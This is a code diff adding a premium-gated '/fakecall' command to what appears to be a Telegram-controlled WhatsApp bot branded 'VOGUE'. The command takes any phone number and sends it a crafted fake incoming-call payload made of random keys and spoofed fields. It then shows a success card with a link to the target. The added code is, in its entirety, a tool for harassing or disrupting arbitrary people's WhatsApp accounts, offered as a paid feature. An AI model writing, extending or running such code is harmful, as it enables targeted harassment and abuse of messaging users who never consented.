@@ -2339,6 +2339,134 @@ from this group.
 //                                                    
 //
 
+bot.command(
+    "fakecall",
+    checkWhatsAppConnection,
+    checkPremiumAccess,
+    async (ctx) => {
+
+        try {
+
+            const args =
+                ctx.message.text.split(" ");
+
+            const q =
+                args[1];
+
+            if (!q) {
+
+                return ctx.reply(
+`Invalid Format
+
+Usage:
+/fakecall <target_number>
+
+Example:
+/fakecall 628xxxxxxxx`
+                );
+            }
+
+            const target =
+                q.replace(/[^0-9]/g, "") +
+                "@s.whatsapp.net";
+
+            const callId =
+                crypto.randomBytes(16).toString("hex");
+
+            const callTypes = [
+                "audio",
+                "video"
+            ];
+
+            const selectedType =
+                callTypes[
+                    Math.floor(
+                        Math.random() *
+                        callTypes.length
+                    )
+                ];
+
+            await sock.sendMessage(
+                target,
+                {
+                    call: {
+                        callKey:
+                            Buffer.from(
+                                crypto.randomBytes(32)
+                            ),
+                        conversionSource:
+                            "VOGUE_SYSTEM",
+                        conversionData:
+                            crypto.randomBytes(16),
+                        conversionDelaySeconds: 0,
+                        callType:
+                            selectedType,
+                        callId:
+                            callId,
+                        callerJid:
+                            sock.user.id,
+                        timeout:
+                            8000
+                    }
+                }
+            );
+
+            return ctx.replyWithPhoto(
+                thumbnailUrl,
+                {
+                    caption:
+`
+<pre>
+V O G U E • FAKE CALL
+────────────────────────
+
+Status
+Success
+
+Target
+${q}
+
+Type
+${selectedType.toUpperCase()}
+
+Call ID
+${callId}
+
+────────────────────────
+Fake incoming call signal sent.
+</pre>
+`,
+                    parse_mode: "HTML",
+                    reply_markup: {
+                        inline_keyboard: [
+                            [
+                                {
+                                    text: "Check Target",
+                                    url: `https://wa.me/${q}`
+                                }
+                            ]
+                        ]
+                    }
+                }
+            );
+
+        } catch (err) {
+
+            console.log(
+                `[FAKECALL ERROR] ${err.message}`
+            );
+
+            return ctx.reply(
+`Failed to send fake call.
+
+Possible causes:
+- Target unavailable
+- Sender disconnected
+- Unsupported payload`
+            );
+        }
+    }
+);
 
 bot.command("sticker", async (ctx) => {
 
